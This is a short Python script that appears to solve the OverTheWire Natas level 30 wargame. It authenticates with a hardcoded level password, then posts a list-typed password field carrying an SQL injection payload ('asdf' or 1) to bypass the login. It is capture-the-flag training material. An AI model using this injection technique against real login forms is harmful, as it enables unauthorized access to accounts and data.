import requests
import string
from requests.auth import HTTPBasicAuth

url = 'http://natas30.natas.labs.overthewire.org/'
response = ''
# base auth
auth = HTTPBasicAuth('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')

# payload
data = {"username": "natas30", "password": ["'asdf' or 1", 4]}

# setup a new session
session = requests.Session()
response = session.post(url, auth = auth, data=data)
text = response.text
print(text)

